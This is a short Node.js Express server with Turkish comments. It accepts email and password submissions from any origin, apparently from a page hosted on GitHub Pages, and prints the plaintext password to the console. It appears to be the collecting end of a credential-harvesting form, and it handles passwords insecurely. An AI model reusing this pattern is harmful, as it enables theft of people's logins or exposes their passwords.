const express = require("express");
const cors = require("cors");

const app = express();

// 🔹 CORS açıyoruz, GitHub Pages ile uyumlu olsun
app.use(cors({
  origin: "*" // deneme için tüm domainlere izin verir
}));

app.use(express.json());

// POST endpoint
app.post("/send", (req, res) => {
  const { email, password } = req.body;

  console.log("Gelen veri:");
  console.log("Email:", email);
  console.log("Şifre:", password);

  res.sendStatus(200);
});

// Render uyumlu port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server çalışıyor:", PORT);
});
